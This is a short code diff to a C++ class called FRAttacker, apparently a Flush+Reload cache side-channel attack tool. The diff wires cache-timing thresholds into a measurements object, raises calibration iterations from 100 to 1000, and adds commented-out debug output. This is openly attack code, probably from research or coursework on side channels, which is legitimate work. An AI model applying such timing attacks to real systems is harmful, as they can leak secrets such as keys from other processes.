@@ -6,6 +6,8 @@
 #include <unistd.h>
 #include <time.h>
 
+//#include <iostream>
+
 using namespace std;
 
 
@@ -32,6 +34,8 @@ void FRAttacker::Attack() {
     // logic
     // create a new measurements class
     measurements = Measurements();
+    measurements.SetInCacheTime(inCacheTime);
+    measurements.SetNoCacheTime(noCacheTime);
 
     // flush for the first time
     if (maxIterations > 0)
@@ -41,6 +45,7 @@ void FRAttacker::Attack() {
     for (int i = 0; i < maxIterations; i++) {
         usleep(interval);
         measured = MeasureTime(targetPointer);
+        //if (measured < 100) cout << measured << endl;
         measurements.AddMeasurement(time(NULL), measured);
     }
     measurements.UpdateSpeculations();
@@ -49,7 +54,7 @@ void FRAttacker::Attack() {
 void FRAttacker::Configure() {
     int i;
     unsigned int cyclesSum = 0;
-    int numOfIterations = 100;
+    int numOfIterations = 1000;
     for (i = 0; i < numOfIterations; i++) {
         Flush(targetPointer);
         cyclesSum += MeasureTime(targetPointer);
@@ -61,4 +66,6 @@ void FRAttacker::Configure() {
         cyclesSum += MeasureTime(targetPointer);
     }
     SetInCacheTime(cyclesSum / numOfIterations);
+    //cout << "in time: " << inCacheTime << endl;
+    //cout << "no time: " << noCacheTime << endl;
 }
